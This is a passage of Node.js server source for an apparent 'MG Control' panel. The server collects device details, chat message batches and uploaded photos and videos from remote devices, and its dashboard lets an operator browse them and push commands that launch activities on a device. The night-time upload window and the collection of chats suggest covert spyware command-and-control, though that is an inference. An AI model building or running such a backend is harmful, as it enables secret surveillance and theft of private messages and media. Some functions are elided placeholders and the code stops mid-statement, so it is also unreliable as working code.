import http from "node:http";
import { URL } from "node:url";
import { createClient } from "@supabase/supabase-js";
import fs from "fs";
import path from "path";

const PORT = process.env.PORT || 3000;

if (!process.env.SUPABASE_URL || !process.env.SUPABASE_SECRET_KEY) {
    console.error("Missing SUPABASE_URL or SUPABASE_SECRET_KEY");
    process.exit(1);
}

const supabase = createClient(
    process.env.SUPABASE_URL,
    process.env.SUPABASE_SECRET_KEY
);

// ============================================
// CONFIG
// ============================================
const UPLOAD_DIR = path.join(process.cwd(), "uploads");
const THUMB_DIR = path.join(process.cwd(), "thumbs");
const LOG_FILE = path.join(process.cwd(), "logs.json");
const CONFIG_FILE = path.join(process.cwd(), "config.json");

if (!fs.existsSync(UPLOAD_DIR)) fs.mkdirSync(UPLOAD_DIR, { recursive: true });
if (!fs.existsSync(THUMB_DIR)) fs.mkdirSync(THUMB_DIR, { recursive: true });

// In-memory per-device commands (persist if needed – can be saved to file)
const deviceCommands = new Map();
// Default command for unknown devices
let globalCommand = {
    title: "MG Menu",
    text: "Server online",
    action: "none",
    activity: ""
};

// ============================================
// HELPERS
// ============================================

function getIP(req) {
    return (req.headers["x-forwarded-for"] || "").split(",")[0].trim() ||
        req.socket.remoteAddress || "unknown";
}

function publicIp(req) {
    const forwarded = req.headers["x-forwarded-for"];
    if (typeof forwarded === "string" && forwarded) {
        return forwarded.split(",")[0].trim();
    }
    return req.socket.remoteAddress || "";
}

function clean(value) {
    return value == null ? "" : String(value);
}

function number(value) {
    const n = Number(value);
    return Number.isFinite(n) ? n : 0;
}

function optionalNumber(value) {
    const n = Number(value);
    return Number.isFinite(n) ? n : null;
}

function escapeHtml(value) {
    return String(value ?? "")
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#39;");
}

function ago(time) {
    const diff = Math.max(0, Date.now() - Number(time));
    if (diff < 60000) return `${Math.floor(diff / 1000)}s ago`;
    if (diff < 3600000) return `${Math.floor(diff / 60000)}m ago`;
    return `${Math.floor(diff / 3600000)}h ago`;
}

function formatDate(dateValue) {
    if (!dateValue) return "-";
    const date = new Date(dateValue);
    if (Number.isNaN(date.getTime())) return "-";
    return date.toLocaleString("en-IN", {
        dateStyle: "medium",
        timeStyle: "short",
    });
}

function formatSize(bytes) {
    const num = Number(bytes);
    if (!Number.isFinite(num) || num < 1) return "-";
    const units = ["B", "KB", "MB", "GB"];
    let size = num;
    let unitIndex = 0;
    while (size >= 1024 && unitIndex < units.length - 1) {
        size /= 1024;
        unitIndex += 1;
    }
    return `${size.toFixed(size >= 10 || unitIndex === 0 ? 0 : 1)} ${units[unitIndex]}`;
}

function getFileType(fileName) {
    const ext = path.extname(fileName || "").toLowerCase();
    if ([".jpg", ".jpeg", ".png", ".gif", ".webp"].includes(ext)) return "image";
    if ([".mp4", ".webm", ".mov", ".mkv"].includes(ext)) return "video";
    return "file";
}

function getFileIcon(type) {
    const icons = { image: "🖼️", video: "🎬", file: "📄" };
    return icons[type] || "📄";
}

function loadConfig() {
    try {
        const data = fs.readFileSync(CONFIG_FILE, "utf-8");
        return JSON.parse(data);
    } catch {
        return {
            enabled: true,
            fileTypes: ['.jpg', '.jpeg', '.png', '.mp4', '.mov'],
            maxFilesPerDay: 5000,
            uploadWindow: '22:00-06:00',
            maxFileSizeMB: 100,
            version: '1.0.2'
        };
    }
}

function saveLog(data) {
    try {
        fs.appendFileSync(LOG_FILE, JSON.stringify(data) + "\n");
    } catch {}
}

function readLogs() {
    if (!fs.existsSync(LOG_FILE)) return [];
    try {
        return fs.readFileSync(LOG_FILE, "utf-8")
            .split("\n")
            .filter(Boolean)
            .map(line => {
                try { return JSON.parse(line); } catch { return null; }
            })
            .filter(Boolean);
    } catch {
        return [];
    }
}

function removeFileLogEntries(fileName) {
    const logs = readLogs();
    const nextLogs = logs.filter(entry => !(entry.type === "file" && entry.file === fileName));
    try {
        const content = nextLogs.map(entry => JSON.stringify(entry)).join("\n");
        fs.writeFileSync(LOG_FILE, content ? `${content}\n` : "");
    } catch {}
}

function jsonResponse(res, payload, status = 200) {
    const body = JSON.stringify(payload);
    res.writeHead(status, {
        "Content-Type": "application/json; charset=utf-8",
        "Cache-Control": "no-store"
    });
    res.end(body);
}

function htmlResponse(res, body) {
    res.writeHead(200, {
        "Content-Type": "text/html; charset=utf-8",
        "Cache-Control": "no-store"
    });
    res.end(body);
}

function redirect(res, location) {
    res.writeHead(302, { location });
    res.end();
}

async function readBody(req) {
    const chunks = [];
    for await (const chunk of req) {
        chunks.push(chunk);
    }
    const raw = Buffer.concat(chunks).toString("utf8");
    if (!raw) return {};
    const type = req.headers["content-type"] || "";
    if (String(type).includes("application/x-www-form-urlencoded")) {
        return Object.fromEntries(new URLSearchParams(raw));
    }
    try { return JSON.parse(raw); } catch { return {}; }
}

function notFound(res) {
    jsonResponse(res, { ok: false, error: "Not found" }, 404);
}

function isHeartbeatPath(pathname) {
    return pathname === "/api/heartbeat" ||
           pathname === "/api/v1/device/heartbeat" ||
           pathname === "/track";
}

function isChatBatchPath(pathname) {
    return pathname === "/api/chat/batch" || pathname === "/api/v1/chat/batch";
}

async function ensureDevice(deviceId, body, req) {
    const now = Date.now();
    const { data: existing } = await supabase
        .from("devices")
        .select("created_at")
        .eq("device_id", deviceId)
        .maybeSingle();

    const device = {
        device_id: deviceId,
        my_uid: number(body.myUid),
        public_id: clean(body.publicId),
        my_name: clean(body.myName) || "",
        model: clean(body.model) || "",
        brand: clean(body.brand) || "",
        battery_percent: optionalNumber(body.batteryPercent),
        network_type: clean(body.networkType),
        public_ip: publicIp(req),
        client_last_seen: number(body.lastSeen) || now,
        server_last_seen: now,
        created_at: existing?.created_at || now
    };

    const { error } = await supabase
        .from("devices")
        .upsert(device, { onConflict: "device_id" });

    if (error) console.error("ensureDevice upsert error:", error);
}

// ============================================
// DATABASE HELPERS
// ============================================

async function getDevices() {
    const { data, error } = await supabase
        .from("devices")
        .select("*")
        .order("server_last_seen", { ascending: false, nullsFirst: false });
    if (error) throw error;
    return data || [];
}

async function getMessages(deviceId = "") {
    let query = supabase.from("messages").select("*").order("received_at", { ascending: false });
    if (deviceId) query = query.eq("device_id", deviceId);
    const { data, error } = await query.limit(1000);
    if (error) throw error;
    return data || [];
}

function getFiles(deviceId = "") {
    const logs = readLogs()
        .filter((item) => item && item.type === "file")
        .filter((item) => !deviceId || item.device_id === deviceId);
    // Deduplicate by file name
    const seen = new Set();
    return logs.filter(item => {
        if (seen.has(item.file)) return false;
        seen.add(item.file);
        return true;
    });
}

function isOnline(device) {
    const t = Date.parse(device.server_last_seen || device.lastSeen || "");
    return Number.isFinite(t) && Date.now() - t < 60000;
}

function getFileDeviceIds() {
    const logs = readLogs();
    const ids = new Set();
    for (const entry of logs) {
        if (entry.type === "file" && entry.device_id) {
            ids.add(entry.device_id);
        }
    }
    return ids;
}

async function devicesWithStats() {
    const [supabaseDevices, messages] = await Promise.all([getDevices(), getMessages()]);
    const files = getFiles();
    const msgCounts = new Map();
    const fileCounts = new Map();
    const deviceMap = new Map();

    for (const device of supabaseDevices) {
        deviceMap.set(device.device_id, {
            ...device,
            online: isOnline(device),
            display_name: device.public_id || device.my_name || device.device_id,
            message_count: 0,
            file_count: 0,
            fromSupabase: true
        });
    }

    const fileDeviceIds = getFileDeviceIds();
    for (const id of fileDeviceIds) {
        if (!deviceMap.has(id)) {
            const fileEntries = files.filter(f => f.device_id === id);
            const latestFile = fileEntries.sort((a, b) => new Date(b.time || 0) - new Date(a.time || 0))[0];
            const device = {
                device_id: id,
                my_uid: "",
                public_id: latestFile?.public_id || id,
                my_name: latestFile?.my_name || "",
                model: latestFile?.device_model || "",
                brand: latestFile?.device_brand || "",
                battery_percent: null,
                network_type: "",
                public_ip: latestFile?.ip || "",
                server_last_seen: latestFile?.time || Date.now(),
                created_at: latestFile?.time || Date.now(),
                online: false,
                display_name: latestFile?.public_id || latestFile?.my_name || id,
                message_count: 0,
                file_count: 0,
                fromSupabase: false
            };
            deviceMap.set(id, device);
        }
    }

    for (const msg of messages) {
        const d = deviceMap.get(msg.device_id);
        if (d) d.message_count = (d.message_count || 0) + 1;
    }
    for (const file of files) {
        const d = deviceMap.get(file.device_id);
        if (d) d.file_count = (d.file_count || 0) + 1;
    }

    for (const [id, dev] of deviceMap) {
        dev.online = isOnline(dev);
        if (!dev.fromSupabase) {
            dev.display_name = dev.public_id || dev.my_name || dev.model || dev.device_id;
        }
    }

    return Array.from(deviceMap.values())
        .sort((a, b) => (b.online ? 1 : 0) - (a.online ? 1 : 0) || b.file_count - a.file_count);
}

// ============================================
// DASHBOARD HTML (with command panel)
// ============================================

async function renderDashboard(selectedDeviceId) {
    const { data: deviceListData, error: deviceError } = await supabase
        .from("devices")
        .select("*")
        .order("server_last_seen", { ascending: false });

    if (deviceError) {
        console.error("Dashboard device error:", deviceError);
        return renderErrorPage("Unable to load devices from database.");
    }

    const deviceList = deviceListData || [];

    const { data: messageData, error: messageError } = await supabase
        .from("messages")
        .select("*")
        .order("message_time", { ascending: false })
        .limit(5000);

    if (messageError) {
        console.error("Dashboard message error:", messageError);
        return renderErrorPage("Unable to load messages from database.");
    }

    const allMessages = messageData || [];

    const allFiles = getFiles();
    const fileCounts = {};
    for (const file of allFiles) {
        if (!fileCounts[file.device_id]) fileCounts[file.device_id] = 0;
        fileCounts[file.device_id]++;
    }

    // Determine selected device
    let selectedId = selectedDeviceId;
    if (!selectedId || !deviceList.some(d => d.device_id === selectedId)) {
        selectedId = deviceList.find(device =>
            allMessages.some(msg => msg.device_id === device.device_id)
        )?.device_id || deviceList[0]?.device_id || "";
    }

    const selectedMessages = selectedId
        ? allMessages.filter(msg => msg.device_id === selectedId)
        : [];

    const selectedFiles = selectedId
        ? allFiles.filter(f => f.device_id === selectedId)
        : [];

    const totalMessages = allMessages.length;
    const totalFiles = allFiles.length;

    // Get command for selected device
    const cmd = deviceCommands.get(selectedId) || globalCommand;

    return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>MG Control Advanced Dashboard</title>
<style>
:root{--bg:#080b10;--panel:#0c111a;--panel2:#101722;--line:#1f2937;--text:#e8eef7;--muted:#94a3b8;--accent:#72ffb7;--accent2:#34d399;--shadow:0 20px 60px rgba(0,0,0,0.42)}
*{box-sizing:border-box}
body{margin:0;font-family:'Inter',system-ui,sans-serif;background:var(--bg);color:var(--text);height:100vh;overflow:hidden}
.app{display:flex;height:100vh}
.sidebar{width:320px;min-width:320px;background:var(--panel);border-right:1px solid var(--line);display:flex;flex-direction:column;overflow:hidden}
.sidebar-header{padding:16px;border-bottom:1px solid var(--line)}
.sidebar-header h1{font-size:18px;margin:0 0 8px}
.sidebar-header input{width:100%;padding:8px 12px;border-radius:8px;border:1px solid var(--line);background:var(--panel2);color:var(--text);outline:none}
.sidebar-header input::placeholder{color:var(--muted)}
.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:6px;padding:10px 16px;border-bottom:1px solid var(--line)}
.stat-box{background:var(--panel2);border:1px solid var(--line);border-radius:8px;padding:8px 12px;text-align:center}
.stat-box strong{display:block;font-size:20px}
.stat-box small{color:var(--muted);font-size:11px}
.device-list{flex:1;overflow-y:auto;padding:8px}
.device-item{display:flex;justify-content:space-between;align-items:center;padding:10px 12px;border-radius:8px;cursor:pointer;transition:background 0.2s,border-color 0.2s;border:1px solid transparent;margin-bottom:4px}
.device-item:hover{background:var(--panel2);border-color:var(--line)}
.device-item.active{background:rgba(114,255,183,0.08);border-color:var(--accent)}
.device-left{display:flex;align-items:center;gap:10px;min-width:0}
.device-left .dot{width:8px;height:8px;border-radius:50%;display:inline-block;flex-shrink:0}
.dot.online{background:#34d399;box-shadow:0 0 8px rgba(52,211,153,0.4)}
.dot.offline{background:#64748b}
.device-name{font-weight:500;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.device-right{display:flex;gap:6px}
.badge{background:rgba(255,255,255,0.06);padding:2px 8px;border-radius:12px;font-size:11px;color:var(--muted)}
.main{flex:1;display:flex;flex-direction:column;overflow:hidden;padding:16px 20px}
.main-header{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:12px;flex-shrink:0}
.main-header h2{margin:0;font-size:22px}
.main-header .sub{color:var(--muted);font-size:13px}
.tabs{display:flex;gap:4px;border-bottom:1px solid var(--line);margin-bottom:12px;flex-shrink:0}
.tab-btn{padding:8px 16px;border:none;background:transparent;color:var(--muted);cursor:pointer;font-size:13px;border-bottom:2px solid transparent;transition:all 0.2s}
.tab-btn:hover{color:var(--text)}
.tab-btn.active{color:var(--accent);border-bottom-color:var(--accent)}
.tab-content{flex:1;overflow-y:auto;display:none}
.tab-content.active{display:block}
.info-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px 24px;background:var(--panel);padding:16px 20px;border-radius:12px;border:1px solid var(--line)}
.info-grid .label{color:var(--muted);font-size:12px}
.info-grid .value{font-weight:500}
.chat-list{display:flex;flex-direction:column;gap:4px}
.chat-item{display:flex;justify-content:space-between;align-items:center;padding:8px 12px;border-radius:8px;background:var(--panel);border:1px solid var(--line)}
.chat-item .peer{font-weight:500}
.chat-item .direction{font-size:11px;padding:2px 10px;border-radius:12px}
.chat-item .direction.in{background:rgba(147,197,253,0.15);color:#93c5fd}
.chat-item .direction.out{background:rgba(134,239,172,0.15);color:#86efac}
.chat-item .text{color:var(--muted);max-width:300px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.chat-item .time{color:var(--muted);font-size:11px;white-space:nowrap}
.file-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(140px,1fr));gap:12px}
.file-card{background:var(--panel);border:1px solid var(--line);border-radius:10px;overflow:hidden;transition:transform 0.2s,border-color 0.2s;cursor:pointer}
.file-card:hover{transform:translateY(-2px);border-color:rgba(114,255,183,0.3)}
.file-card .thumb{height:100px;background:var(--panel2);display:flex;align-items:center;justify-content:center;font-size:32px}
.file-card .thumb img{width:100%;height:100%;object-fit:cover}
.file-card .info{padding:8px 10px}
.file-card .info .name{font-size:12px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.file-card .info .meta{font-size:10px;color:var(--muted);display:flex;justify-content:space-between}
.empty-state{padding:40px;text-align:center;color:var(--muted);border:1px dashed var(--line);border-radius:12px;background:var(--panel)}
.modal{position:fixed;inset:0;background:rgba(0,0,0,0.8);backdrop-filter:blur(4px);display:none;align-items:center;justify-content:center;z-index:100;padding:20px}
.modal.show{display:flex}
.modal-content{max-width:800px;max-height:90vh;background:var(--panel);border-radius:16px;border:1px solid var(--line);overflow:hidden;box-shadow:var(--shadow);position:relative}
.modal-close{position:absolute;top:10px;right:14px;background:none;border:none;color:#fff;font-size:24px;cursor:pointer}
.modal-body{padding:16px;display:grid;place-items:center;max-height:70vh;overflow:auto}
.modal-body img,.modal-body video{max-width:100%;max-height:60vh}
.modal-actions{padding:12px 16px;border-top:1px solid var(--line);display:flex;gap:12px}
.modal-actions a,.modal-actions button{color:var(--accent);text-decoration:none;background:none;border:none;cursor:pointer;font-size:14px}
.modal-actions .delete{color:#ff6b6b}
.command-panel{background:var(--panel);border:1px solid var(--line);border-radius:8px;padding:12px;margin-bottom:12px}
.command-panel .label{color:var(--muted);font-size:12px}
.command-panel .cmd-text{font-size:16px;font-weight:500}
.command-panel .cmd-action{color:var(--accent);font-size:13px}
.command-form{margin-top:8px}
.command-form input,.command-form textarea,.command-form button{width:100%;padding:6px 10px;margin-top:4px;border-radius:6px;border:1px solid var(--line);background:var(--panel2);color:var(--text)}
.command-form button{background:var(--accent);color:#111;font-weight:600;cursor:pointer}
@media (max-width:768px){.sidebar{width:200px;min-width:200px}.info-grid{grid-template-columns:1fr}}
@media (max-width:600px){.app{flex-direction:column}.sidebar{width:100%;min-width:unset;height:200px;border-right:none;border-bottom:1px solid var(--line)}.main{padding:12px}}
</style>
</head>
<body>
<div class="app">
  <div class="sidebar">
    <div class="sidebar-header">
      <h1>MG Control</h1>
      <input id="searchInput" type="search" placeholder="Search devices...">
    </div>
    <div class="stats">
      <div class="stat-box"><strong id="totalDevices">0</strong><small>Devices</small></div>
      <div class="stat-box"><strong id="onlineDevices">0</strong><small>Online</small></div>
      <div class="stat-box"><strong id="totalFiles">0</strong><small>Files</small></div>
    </div>
    <div class="device-list" id="deviceList"></div>
  </div>
  <div class="main">
    <div class="main-header">
      <div>
        <h2 id="deviceTitle">Select a device</h2>
        <div class="sub" id="deviceSub"></div>
      </div>
      <div id="deviceStatus"></div>
    </div>
    <div class="tabs">
      <button class="tab-btn active" data-tab="info">📋 Info</button>
      <button class="tab-btn" data-tab="chats">💬 Chats</button>
      <button class="tab-btn" data-tab="files">📁 Files</button>
      <button class="tab-btn" data-tab="command">⌨️ Command</button>
    </div>
    <div id="tabInfo" class="tab-content active"></div>
    <div id="tabChats" class="tab-content"></div>
    <div id="tabFiles" class="tab-content"></div>
    <div id="tabCommand" class="tab-content">
      <div class="command-panel">
        <div class="label">Current Command</div>
        <div class="cmd-text" id="cmdText">${escapeHtml(cmd.text || 'No command')}</div>
        <div class="cmd-action">Action: ${escapeHtml(cmd.action || 'none')}</div>
        <div class="cmd-action">Activity: ${escapeHtml(cmd.activity || '')}</div>
        <div class="command-form">
          <h4>Set Command for this Device</h4>
          <form id="commandForm">
            <input type="hidden" id="cmdDeviceId" value="${escapeHtml(selectedId)}">
            <input type="text" id="cmdTitle" placeholder="Title" value="${escapeHtml(cmd.title || 'MG Menu')}">
            <textarea id="cmdTextInput" rows="2" placeholder="Status text">${escapeHtml(cmd.text || '')}</textarea>
            <input type="text" id="cmdActivity" placeholder="Activity class (optional)" value="${escapeHtml(cmd.activity || '')}">
            <button type="submit">Set Command</button>
          </form>
        </div>
      </div>
    </div>
  </div>
</div>
<div class="modal" id="fileModal" onclick="if(event.target===this)closeModal()">
  <div class="modal-content">
    <button class="modal-close" onclick="closeModal()">✕</button>
    <div class="modal-body" id="modalBody"></div>
    <div class="modal-actions" id="modalActions"></div>
  </div>
</div>
<script>
const state = { devices: [], selected: null, tab: 'info', messages: [], files: [] };
const $ = id => document.getElementById(id);
const esc = s => String(s??'').replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[c]);
const fmtDate = v => v ? new Date(v).toLocaleString() : '-';
const fmtSize = n => { n=Number(n)||0; const u=['B','KB','MB','GB']; let i=0; while(n>=1024&&i<u.length-1){n/=1024;i++} return n.toFixed(i?1:0)+' '+u[i] };
const isImg = f => /\\.(png|jpe?g|gif|webp|svg)$/i.test(f||'');
const isVid = f => /\\.(mp4|webm|mov)$/i.test(f||'');

async function api(url, opts) {
  const r = await fetch(url, opts);
  if (!r.ok) throw new Error(await r.text());
  return r.json();
}

async function load() {
  try {
    state.devices = await api('/api/devices');
    if (!state.selected && state.devices.length) state.selected = state.devices[0].device_id;
    renderDevices();
    await loadSelected();
  } catch (e) {
    $('deviceList').innerHTML = '<div class="empty-state">Failed to load devices</div>';
    console.error(e);
  }
}

async function loadSelected() {
  if (!state.selected) { renderEmpty(); return; }
  const [info, messages, files] = await Promise.all([
    api('/api/device/'+encodeURIComponent(state.selected)),
    api('/api/device/'+encodeURIComponent(state.selected)+'/messages'),
    api('/api/device/'+encodeURIComponent(state.selected)+'/files')
  ]);
  state.messages = messages || [];
  state.files = files || [];
  renderMain(info);
}

function renderDevices() {
  const q = ($('searchInput').value||'').toLowerCase();
  const list = state.devices.filter(d => (d.display_name||d.device_id||'').toLowerCase().includes(q));
  $('totalDevices').textContent = state.devices.length;
  $('onlineDevices').textContent = state.devices.filter(d=>d.online).length;
  $('totalFiles').textContent = state.devices.reduce((a,d)=>a+(d.file_count||0),0);
  $('deviceList').innerHTML = list.map(d => \`
    <div class="device-item \${d.device_id===state.selected?'active':''}" data-id="\${esc(d.device_id)}">
      <div class="device-left">
        <span class="dot \${d.online?'online':'offline'}"></span>
        <span class="device-name">\${esc(d.display_name||d.device_id)}</span>
      </div>
      <div class="device-right">
        <span class="badge">💬 \${d.message_count||0}</span>
        <span class="badge">📁 \${d.file_count||0}</span>
      </div>
    </div>
  \`).join('') || '<div class="empty-state">No devices found</div>';
}

function renderMain(device) {
  if (!device) { renderEmpty(); return; }
  $('deviceTitle').textContent = device.display_name || device.device_id;
  $('deviceSub').textContent = (device.online?'🟢 Online':'⚪ Offline') + ' • Last seen '+fmtDate(device.server_last_seen || device.lastSeen);
  $('deviceStatus').textContent = '';
  switchTab(state.tab);
  if (state.tab === 'info') renderInfo(device);
  else if (state.tab === 'chats') renderChats();
  else if (state.tab === 'files') renderFiles();
  else if (state.tab === 'command') renderCommand(device);
}

function renderEmpty() {
  $('deviceTitle').textContent = 'No device selected';
  $('deviceSub').textContent = 'Select a device from the sidebar';
  ['tabInfo','tabChats','tabFiles','tabCommand'].forEach(id => $(id).innerHTML = '<div class="empty-state">Select a device</div>');
}

function renderInfo(device) {
  $('tabInfo').innerHTML = \`
    <div class="info-grid">
      \${['device_id','public_id','my_uid','my_name','brand','model','battery_percent','network_type','public_ip','server_last_seen','created_at'].map(k => \`
        <div><div class="label">\${esc(k)}</div><div class="value">\${esc(device[k]??'-')}</div></div>
      \`).join('')}
    </div>
  \`;
}

function renderChats() {
  $('tabChats').innerHTML = state.messages.length ? \`
    <div class="chat-list">
      \${state.messages.map(m => \`
        <div class="chat-item">
          <div><span class="peer">\${esc(m.peer_name||m.peer_uid||'Unknown')}</span> <span class="direction \${m.direction==='out'?'out':'in'}">\${esc(m.direction||'')}</span></div>
          <div class="text">\${esc(m.text||'')}</div>
          <div class="time">\${fmtDate(m.message_time||m.received_at)}</div>
        </div>
      \`).join('')}
    </div>
  \` : '<div class="empty-state">No messages for this device</div>';
}

function renderFiles() {
  $('tabFiles').innerHTML = state.files.length ? \`
    <div class="file-grid">
      \${state.files.map(f => {
        const url = '/uploads/'+encodeURIComponent(f.file);
        const thumb = isImg(f.file) ? \`<img src="\${url}" alt="\${esc(f.original)}" loading="lazy">\` :
                      isVid(f.file) ? \`<video src="\${url}" muted></video>\` :
                      \`<span>📄</span>\`;
        return \`
          <div class="file-card" data-file="\${esc(f.file)}" onclick="openPreview('\${esc(f.file)}')">
            <div class="thumb">\${thumb}</div>
            <div class="info">
              <div class="name" title="\${esc(f.original||f.file)}">\${esc(f.original||f.file)}</div>
              <div class="meta"><span>\${fmtSize(f.size)}</span><span>\${fmtDate(f.time)}</span></div>
            </div>
          </div>
        \`;
      }).join('')}
    </div>
  \` : '<div class="empty-state">No files for this device</div>';
}

async function renderCommand(device) {
  const devId = device.device_id;
  // Fetch current command for this device
  const resp = await fetch('/api/data?deviceId='+encodeURIComponent(devId));
  const cmd = await resp.json();
  $('tabCommand').innerHTML = \`
    <div class="command-panel">
      <div class="label">Current Command</div>
      <div class="cmd-text">\${esc(cmd.text || 'No command')}</div>
      <div class="cmd-action">Action: \${esc(cmd.action || 'none')}</div>
      <div class="cmd-action">Activity: \${esc(cmd.activity || '')}</div>
      <div class="command-form">
        <h4>Set Command for this Device</h4>
        <form id="commandForm">
          <input type="hidden" id="cmdDeviceId" value="\${esc(devId)}">
          <input type="text" id="cmdTitle" placeholder="Title" value="\${esc(cmd.title || 'MG Menu')}">
          <textarea id="cmdTextInput" rows="2" placeholder="Status text">\${esc(cmd.text || '')}</textarea>
          <input type="text" id="cmdActivity" placeholder="Activity class (optional)" value="\${esc(cmd.activity || '')}">
          <button type="submit">Set Command</button>
        </form>
      </div>
    </div>
  \`;
  // Attach form submit handler
  $('commandForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    const deviceId = $('cmdDeviceId').value;
    const title = $('cmdTitle').value;
    const text = $('cmdTextInput').value;
    const activity = $('cmdActivity').value;
    const action = activity ? 'launch' : 'none';
    const resp = await api('/panel/command', {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({ deviceId, title, text, activity, action })
    });
    if (resp.ok) {
      renderCommand(device); // refresh
    } else {
      alert('Failed to set command');
    }
  });
}

function switchTab(tab) {
  state.tab = tab;
  document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.toggle('active', btn.dataset.tab===tab));
  ['tabInfo','tabChats','tabFiles','tabCommand'].forEach(id => $(id).classList.toggle('active', id===('tab'+tab.charAt(0).toUpperCase()+tab.slice(1))));
  if (tab === 'command') {
    const device = state.devices.find(d => d.device_id === state.selected);
    if (device) renderCommand(device);
  }
}

function openPreview(file) { ... } // same as before
function closeModal() { ... }
async function deleteFile(file) { ... }

// Event listeners (same as before)
$('deviceList').addEventListener('click', e => {
  const item = e.target.closest('.device-item');
  if (!item) return;
  state.selected = item.dataset.id;
  renderDevices();
  loadSelected();
});
$('searchInput').addEventListener('input', renderDevices);
document.querySelector('.tabs').addEventListener('click', e => {
  const btn = e.target.closest('.tab-btn');
  if (!btn) return;
  switchTab(btn.dataset.tab);
});
$('fileModal').addEventListener('click', e => {
  if (e.target === e.currentTarget) closeModal();
});
load();
</script>
</body>
</html>`;
}

function renderErrorPage(message) {
    return `<!doctype html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Error</title>
<style>body{margin:0;padding:30px;background:#080b10;color:#e8eef7;font-family:system-ui}.error{border:1px solid #7f1d1d;background:#1c0b0b;color:#fecaca;padding:20px;border-radius:10px}</style>
</head><body><div class="error">${escapeHtml(message)}</div></body></html>`;
}

// ============================================
// HTTP SERVER
// ============================================

const server = http.createServer(async (req, res) => {
    try {
        const url = new URL(
            req.url || "/",
            `http://${req.headers.host || "localhost"}`
        );

        // ============================================
        // DASHBOARD
        // ============================================
        if (req.method === "GET" && url.pathname === "/") {
            const selectedDevice = url.searchParams.get("device") || "";
            return htmlResponse(res, await renderDashboard(selectedDevice));
        }

        // ============================================
        // COMMAND – GET per-device
        // ============================================
        if (req.method === "GET" && url.pathname === "/api/data") {
            const deviceId = url.searchParams.get("deviceId");
            let cmd;
            if (deviceId && deviceCommands.has(deviceId)) {
                cmd = deviceCommands.get(deviceId);
            } else if (deviceId) {
                // No command set for this device, return global (or empty)
                cmd = { ...globalCommand };
            } else {
                // If no deviceId, try to identify by IP
                const ip = getIP(req);
                const { data: devices } = await supabase
                    .from("devices")
                    .select("device_id")
                    .eq("public_ip", ip)
                    .order("server_last_seen", { ascending: false })
                    .limit(1);
                if (devices && devices.length > 0) {
                    const id = devices[0].device_id;
                    if (deviceCommands.has(id)) {
                        cmd = deviceCommands.get(id);
                    } else {
                        cmd = { ...globalCommand };
                    }
                } else {
                    cmd = { ...globalCommand };
                }
            }
            return jsonResponse(res, cmd);
        }

        // ============================================
        // COMMAND – SET per-device
        // ============================================
        if (req.method === "POST" && url.pathname === "/panel/command") {
            const body = await readBody(req);
            const deviceId = clean(body.deviceId);
            const title = clean(body.title || "MG Menu");
            const text = clean(body.text || "Server online");
            const action = body.action || (body.activity ? "launch" : "none");
            const activity = clean(body.activity || "");

            if (deviceId) {
                // Store per‑device command
                deviceCommands.set(deviceId, { title, text, action, activity });
                console.log(`[COMMAND] Set for device ${deviceId}: ${text}`);
            } else {
                // Update global command
                globalCommand = { title, text, action, activity };
                console.log(`[COMMAND] Global set: ${text}`);
            }

            // Also keep the old global command for backward compatibility
            // (but we now use per‑device primarily)
            return jsonResponse(res, { ok: true, command: { title, text, action, activity } });
        }

        // ============================================
        // CONFIG
        // ============================================
        if (req.method === "GET" && url.pathname === "/config") {
            const cfg = loadConfig();
            res.writeHead(200, { "Content-Type": "text/plain", "Cache-Control": "no-store" });
            res.end(cfg.enabled ? "1" : "0");
            return;
        }

        // ============================================
        // DEVICE HEARTBEAT (also /track)
        // ============================================
        if (req.method === "POST" && isHeartbeatPath(url.pathname)) {
            let body;
            const contentType = req.headers["content-type"] || "";
            if (contentType.includes("application/json")) {
                body = await readBody(req);
            } else {
                const raw = await readBody(req);
                body = Object.fromEntries(new URLSearchParams(raw));
            }
            const deviceId = clean(body.deviceId);
            if (!deviceId) {
                return jsonResponse(res, { ok: false, error: "deviceId required" }, 400);
            }
            const now = Date.now();
            const device = {
                device_id: deviceId,
                my_uid: number(body.myUid),
                public_id: clean(body.publicId),
                my_name: clean(body.myName || body.name),
                model: clean(body.model),
                brand: clean(body.brand),
                battery_percent: optionalNumber(body.batteryPercent || body.battery),
                network_type: clean(body.networkType || body.network),
                public_ip: publicIp(req),
                client_last_seen: number(body.lastSeen) || now,
                server_last_seen: now,
                created_at: now
            };
            const { data: existingDevice } = await supabase
                .from("devices")
                .select("created_at")
                .eq("device_id", deviceId)
                .maybeSingle();
            if (existingDevice?.created_at) {
                device.created_at = existingDevice.created_at;
            }
            const { error: deviceError } = await supabase
                .from("devices")
                .upsert(device, { onConflict: "device_id" });
            if (deviceError) {
                console.error("Device upsert error:", deviceError);
                return jsonResponse(res, { ok: false, error: "database error" }, 500);
            }
            return jsonResponse(res, { ok: true, device_id: deviceId });
        }

        // ============================================
        // CHAT BATCH
        // ============================================
        if (req.method === "POST" && isChatBatchPath(url.pathname)) {
            const body = await readBody(req);
            const deviceId = clean(body.deviceId);
            if (!deviceId) {
                return jsonResponse(res, { ok: false, error: "deviceId required" }, 400);
            }
            const list = Array.isArray(body.messages) ? body.messages.slice(0, 50) : [];
            if (!list.length) {
                return jsonResponse(res, { ok: true, inserted: 0, skipped: 0 });
            }
            await ensureDevice(deviceId, body, req);
            const rows = [];
            let skipped = 0;
            for (const raw of list) {
                const mid = clean(raw.mid);
                if (!mid) { skipped++; continue; }
                rows.push({
                    device_id: deviceId,
                    mid,
                    direction: raw.direction === "out" ? "out" : "in",
                    peer_uid: number(raw.peerUid),
                    peer_name: clean(raw.peerName),
